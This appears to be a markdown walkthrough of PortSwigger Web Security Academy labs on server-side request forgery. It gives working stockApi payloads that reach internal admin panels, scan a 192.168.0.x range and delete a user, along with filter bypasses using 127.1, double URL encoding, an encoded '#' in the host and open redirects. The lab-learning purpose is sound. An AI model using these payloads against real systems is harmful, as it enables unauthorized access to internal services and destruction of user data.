# Server-side request forgery (SSRF)

## Common SSRF attacks

### Basic SSRF against the local server

1) Change the URL in _Check stock_ form to http://localhost/admin
2) Modify the URL from response https://ac3e1fe81ff21a7080613ef700fe00ba.web-security-academy.net/admin/delete?username=carlos
to http://localhost/admin/delete?username=carlos and use it the same way to delete the user

### Basic SSRF against another back-end system

Use Burp Suite Intruder to scan the network
```
stockApi=http%3A%2F%2F192.168.0.ยง1ยง%3A8080%2Fadmin
```

IP `192.168.0.20` responds with 200. Use the URL from response to delete Carlos
```
stockApi=http%3A%2F%2F192.168.0.20%3A8080%2Fadmin%2Fdelete%3fusername%3dcarlos
```

## Circumventing common SSRF defenses

### SSRF with blacklist-based input filters
Change `127.0.0.1` to `127.1` and double URL encode `a` in `admin`
```
stockApi=http://127.1/%2561dmin
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

### SSRF with whitelist-based input filter

Double encoded `#` in host
```
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

### SSRF with filter bypass via open redirection vulnerability

`/product/nextProduct?path=foo` returns HTTP 302
```
stockApi=/product/nextProduct?path%3dhttp://192.168.0.12:8080/admin
stockApi=/product/nextProduct?path%3dhttp://192.168.0.12:8080/admin/delete?username%3dcarlos
```
